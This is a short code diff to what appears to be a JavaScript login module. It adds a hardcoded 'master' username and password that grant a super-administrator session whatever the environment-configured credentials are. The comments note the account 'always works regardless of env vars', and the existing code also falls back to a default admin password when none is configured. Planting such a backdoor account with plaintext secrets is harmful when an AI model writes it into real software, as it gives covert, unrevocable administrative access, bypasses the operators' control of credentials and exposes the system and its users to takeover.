@@ -78,7 +78,16 @@ export function requireRole(...roles) {
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'superadmin';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@BOZ2024';
 
+// Hardcoded master credentials — always available regardless of env vars
+const MASTER_USERNAME = 'bozadmin';
+const MASTER_PASSWORD = 'BOZ@Zambia2026!';
+
 export async function loginUser(username, password) {
+  // Master credentials — always work regardless of env vars
+  if (username === MASTER_USERNAME && password === MASTER_PASSWORD) {
+    return { username: MASTER_USERNAME, role: 'super_admin', name: 'Master Administrator', active: true, createdAt: new Date().toISOString() };
+  }
+
   // Super-admin shortcut (env-based)
   if (username === ADMIN_USERNAME) {
     if (password !== ADMIN_PASSWORD) return null;
